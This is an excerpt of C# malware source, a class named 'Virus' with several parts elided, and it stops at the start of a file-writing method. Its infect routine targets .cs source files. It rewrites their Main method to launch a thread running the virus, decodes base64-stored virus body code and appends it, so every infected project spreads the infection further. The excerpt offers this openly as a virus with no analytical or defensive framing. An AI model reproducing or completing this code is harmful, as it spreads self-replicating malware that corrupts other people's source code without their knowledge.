    ...
    public class Virus
    {
        ...
        private static void infect(string file, string s, string ext, int g)
        {
            ...
            else if ((ext == ".cs") && (g == 0))
            {
                ...
                string yu = "Main(string[] args)\r\n\t{\r\n\tSystem.Threading.Thread gxzxzxzxz = " +
                            "new System.Threading.Thread(" + namespacex + ".Virus.LOL);\r\n\tgxzxzxzxz.Start();";
                s = s.Replace(s.Substring(x, (yy - x) + 1), yu);
                string[] t = database.Split(new char[] { '>' });
                string body2 = decodeb64(t[2]).Replace(decodeb64("aG0xMjM0"), namespacex);
                writerx(file, s + "\r\n" + body2 + database + decodeb64(t[3]) + "\r\n");
            }
        }
        private static void writerx(string path, string datax)
        {
